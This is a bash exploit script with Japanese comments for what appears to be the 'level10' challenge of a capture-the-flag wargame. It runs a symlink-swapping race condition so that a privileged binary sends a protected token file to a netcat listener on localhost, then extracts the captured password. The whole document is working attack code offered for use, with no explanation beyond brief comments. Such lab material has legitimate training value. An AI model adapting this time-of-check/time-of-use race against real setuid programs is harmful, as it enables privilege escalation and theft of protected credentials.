#!/bin/bash

# 以前のプロセスをクリーンアップ
killall -9 nc 2>/dev/null
killall -9 level10 2>/dev/null
rm -f /tmp/link /tmp/output /tmp/dummy
touch /tmp/dummy

echo "Starting exploit..."

# リンク切り替えループ (バックグラウンド)
while true; do
  ln -sf /tmp/dummy /tmp/link
  ln -sf /home/user/level10/token /tmp/link
done &
LINK_PID=$!

# 受信ループ (バックグラウンド)
while true; do
  nc -l 6969 >>/tmp/output 2>/dev/null
done &
NC_PID=$!

# 攻撃ループ
# 競合状態が発生するまで繰り返す
for i in {1..10000}; do
  ./level10 /tmp/link 127.0.0.1 >/dev/null 2>&1

  # パスワード（wから始まる文字列）が取得できたか確認
  # if [ -s /tmp/output ] && grep -q "woupa" /tmp/output; then
  #     echo "Hit!"
  #     break
  # fi
done

echo "--- Result ---"
# ノイズを除去してパスワードを表示
grep -v "^\.\*" /tmp/output | grep -v "^$" | head -n 1
echo "--------------"

# 後片付け
kill $LINK_PID
kill $NC_PID
killall -9 nc 2>/dev/null
